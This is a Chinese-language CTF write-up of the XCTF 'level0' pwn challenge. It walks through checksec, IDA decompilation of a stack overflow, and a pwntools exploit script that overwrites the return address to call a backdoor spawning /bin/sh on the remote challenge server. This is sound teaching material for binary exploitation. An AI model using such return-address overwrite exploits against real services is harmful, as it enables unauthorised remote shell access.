---
title: "XCTF Pwn Level0"
date: 2020-01-15T19:03:07+08:00
author: NiceSeven
categories:
  - XCTF
tags:
  - Pwn
---

# level0

首先checksec 看看开启了什么防护

![image-20200115164710285](/images/image-20200115164710285.png)

64位的程序

开启了NX：内存栈不可执行保护机制，传入栈的数据不可直接执行，可以使用rop链绕过

本地运行一下看看，输出一个Hello,World等待输入

![image-20200115165004628](/images/image-20200115165004628.png)

拖入IDA分析，F5反编译main函数

![image-20200115165116402](/images/image-20200115165116402.png)

进入vulnerable_function()函数

![image-20200115165359604](/images/image-20200115165359604.png)

漏洞很明显了一个80h的栈可以读入0x200的数据，明显的栈溢出

我们查看程序有没有后门，shift+f12查看字符串存在callsystem()函数调用system("/bin/sh\")

![image-20200115170025722](/images/image-20200115170025722.png)

编写exp

```python
#!/usr/bin/python
#coding=UTF-8
from pwn import *
sh = remote('111.198.29.45',45960)
elf = ELF('./level0') #开启本地程序的句柄
callsystem_addr = elf.symbols['callsystem'] 
#symbols函数用于获取获取一个标志的地址，这个标志可以是system函数、bss全局变量等
payload = 'a'*0x80 + 'a'*8 + p64(callsystem_addr)
#sh.recv()
sh.sendlineafter('Hello, World\n',payload)#接收到Hello, World之后传入payload
sh.interactive()#接收shell
```

注意这里的payload填充0x80后还需要填充8个字节(64位)的数据来覆盖rbp，之后才是覆盖retn

![image-20200115172339397](/images/image-20200115172339397.png)